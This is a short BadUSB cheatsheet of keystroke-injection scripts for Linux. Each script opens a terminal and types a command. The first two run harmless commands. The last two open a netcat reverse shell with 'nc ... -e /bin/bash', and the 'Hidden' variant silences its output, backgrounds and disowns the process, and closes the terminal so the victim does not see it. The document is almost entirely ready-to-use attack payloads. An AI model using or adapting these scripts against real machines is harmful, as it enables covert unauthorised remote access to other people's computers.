# BadUSb cheatsheet for Linux

Launch a command

	LED 0 255 0
	DELAY 1000
	LED 0 0 0
	LOCALE US
	DELAY 1000
	ALT F2
	DELAY 500
	STRING gnome-terminal
	ENTER
	DELAY 500
	STRING uname -a
	ENTER
	LED 255 0 0

Open a URL

	LED 0 255 0
	DELAY 1000
	LED 0 0 0
	LOCALE US
	DELAY 1000
	ALT F2
	DELAY 500
	STRING gnome-terminal
	ENTER
	DELAY 500
	STRING firefox https://www.youtube.com/

Netcat shell

	LED 0 255 0
	DELAY 1000
	LED 0 0 0
	LOCALE US
	DELAY 1000
	ALT F2
	DELAY 500
	STRING gnome-terminal
	ENTER
	DELAY 500
	STRING nc 127.0.0.1 4444 -e /bin/bash
	ENTER
	
Hidden Netcat Shell

	LED 0 255 0
	DELAY 1000
	LED 0 0 0
	LOCALE US
	DELAY 1000
	ALT F2
	DELAY 500
	STRING gnome-terminal
	ENTER
	DELAY 500
	STRING nc 127.0.0.1 4444 -e /bin/bash > /dev/null 2>&1
	ENTER
	DELAY 500
	CTRL Z
	DELAY 500
	STRING bg
	ENTER
	STRING disown
	ENTER
	STRING exit
	ENTER
	LED 0 0 255
